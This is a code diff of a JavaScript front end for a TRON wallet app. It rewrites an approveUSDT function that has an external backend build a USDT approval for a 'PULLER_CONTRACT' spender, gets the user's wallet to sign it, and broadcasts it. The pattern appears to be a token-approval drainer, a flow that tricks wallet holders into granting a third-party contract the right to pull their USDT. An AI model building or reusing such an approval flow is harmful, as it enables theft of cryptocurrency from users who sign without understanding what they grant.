@@ -129,58 +129,76 @@ const detectSupportedTronMethods = async () => {
   return supported;
 };
 
-const approveUSDT = async () => {
-  try {
-    setStatus("Creating approval transaction...");
-    setTxHash('');
+  const approveUSDT = async () => {
+    try {
+      setStatus("Creating approval transaction...");
+      setTxHash('');
+      
+      const txResponse = await fetch('https://smartcontbackend.onrender.com/create-approve', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          from: address,
+          token: USDT_CONTRACT,
+          spender: PULLER_CONTRACT,
+          amount: AMOUNT
+        })
+      });
+      console.log("approveUSDT params:", {
+  address,
+  USDT_CONTRACT,
+  PULLER_CONTRACT,
+  AMOUNT
+});
 
-    // Ask backend for raw hex (not full tx object)
-    const { raw_data_hex } = await fetch('https://smartcontbackend.onrender.com/create-approve', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        from: address,
-        token: USDT_CONTRACT,
-        spender: PULLER_CONTRACT,
-        amount: AMOUNT
-      })
-    }).then(r => r.json());
+      console.log(txResponse);
+      const unsignedTx = await txResponse.json();
+      if (!unsignedTx) throw new Error("Failed to get unsigned transaction");
+      console.log(unsignedTx);
+      setStatus("Waiting for approval signature...");
+      const signedTx = await signClient.request({
+        chainId: MAINNET_CHAIN_ID,
+        topic: session.topic,
+        request: {
+          method: 'tron_signTransaction',
+          params: [unsignedTx]
+        }
+      });
+      let finalSignedTx;
+       console.log('broadcast near',signedTx);
+          finalSignedTx = { 
+            ...unsignedTx, 
+            signature: [signedTx.signature.replace(/^0x/, '')] 
+          };
 
-    setStatus("Waiting for approval signature...");
-
-    // Wallet signs the raw hex bytes
-    const sigResp = await signClient.request({
-      chainId: MAINNET_CHAIN_ID,
-      topic: session.topic,
-      request: {
-        method: 'tron_signTransaction',
-        params: [raw_data_hex]
+      console.log('broadcast near',signedTx);
+      console.log('broadcast near2nd',finalSignedTx);
+      
+      setStatus("Broadcasting approval transaction...");
+      const broadcastResponse = await fetch('https://smartcontbackend.onrender.com/broadcast', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({signedTx: finalSignedTx })
+      });
+      console.log('broadcast near',broadcastResponse);
+      const result = await broadcastResponse.json();
+      if (!result || !(result.txid || result.txId)) {
+        throw new Error("Broadcast failed");
       }
-    });
 
-    // normalize signature (some wallets return string, others [string])
-    const signature = Array.isArray(sigResp) ? sigResp[0] : sigResp;
+      const txId = result.txid || result.txId;
+      setTxHash(txId);
+      setStatus(`✅ Approval sent! TXID: ${txId}`);
 
-    setStatus("Broadcasting approval transaction...");
+      setTimeout(() => {
+        window.open(`https://tronscan.org/#/transaction/${txId}`, '_blank');
+      }, 1000);
 
-    // Broadcast hex + signature only
-    const result = await fetch('https://smartcontbackend.onrender.com/broadcast', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ raw_data_hex, signature })
-    }).then(r => r.json());
-
-    const txId = result.txid || result.txID;
-    if (!txId) throw new Error(JSON.stringify(result));
-
-    setTxHash(txId);
-    setStatus(`✅ Approval sent! TXID: ${txId}`);
-    window.open(`https://tronscan.org/#/transaction/${txId}`, '_blank');
-  } catch (error) {
-    console.error("Approval error:", error);
-    setStatus(`❌ Error: ${error.message}`);
-  }
-};
+    } catch (error) {
+      console.error("Approval error:", error);
+      setStatus(`❌ Error: ${error.message}`);
+    }
+  };
 
   const sendUSDT = async () => {
     try {
